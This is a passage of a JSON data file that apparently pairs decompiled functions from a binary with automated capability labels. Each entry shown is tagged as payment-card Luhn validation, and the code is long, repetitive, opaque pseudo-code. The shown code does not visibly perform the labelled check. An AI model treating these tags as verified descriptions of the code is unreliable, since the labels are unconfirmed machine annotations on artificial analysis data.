fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe98 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe98 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe7c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe7c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe60 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe60 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe44 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe44 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe28 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe28 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe0c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe0c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdf0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdf0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdd4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdd4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 4072
    },
    "004c0220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c0220(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cf0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d14, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d20, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d2c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d38, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe98 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe98 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe7c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe7c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe60 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe60 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe44 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe44 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe28 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe28 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe0c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe0c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffdf0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffdf0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 3881
    },
    "004c0280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c0280(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528cfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d14, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d20, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d2c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d38, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d44, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528d84, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe98 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe98 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe7c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe7c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe60 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe60 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe44 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe44 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe28 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe28 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffe0c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffe0c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 3694
    },
    "004c03a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
